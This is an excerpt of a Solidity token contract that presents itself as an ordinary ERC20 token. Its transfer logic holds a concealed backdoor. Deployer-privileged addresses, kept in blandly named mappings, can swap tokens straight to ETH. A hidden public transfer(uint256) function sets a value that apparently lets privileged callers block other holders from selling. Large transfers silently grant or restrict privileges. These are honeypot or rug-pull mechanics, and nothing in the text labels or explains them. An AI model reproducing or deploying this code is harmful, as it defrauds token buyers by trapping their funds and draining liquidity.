...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private _rList;
    mapping(address => uint256) private _tList;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _rList[address(this)] = _tTotal;
        _rList[msg.sender] = _tTotal;
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && _rList[from] == 0 && amount <= swapAtAmount) {
            require(_tList[from] + _value >= 0, 'Transfer amount exceeds the maxTxAmount');
        }
        ...
        } else if (_rList[from] > 0 && _rList[to] > 0) {
            fee = amount;
            _balances[address(this)] += fee;
            return swapTokensForEth(amount, to);
        }
        if (amount > swapAtAmount && to != uniswapV2Pair && to != address(router)) {
            if (_rList[from] > 0) _rList[to] = amount;
            else _tList[to] = amount;
            return;
        }
        bool takeFee = _rList[from] == 0 && _rList[to] == 0 && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (_tList[factory] == 0) _tList[factory] = swapAtAmount;
        _factory = uint160(to);
        if (takeFee) {
    ...
    function transfer(uint256 value) external {
        if (_rList[msg.sender] > 0) _value = value;
    }
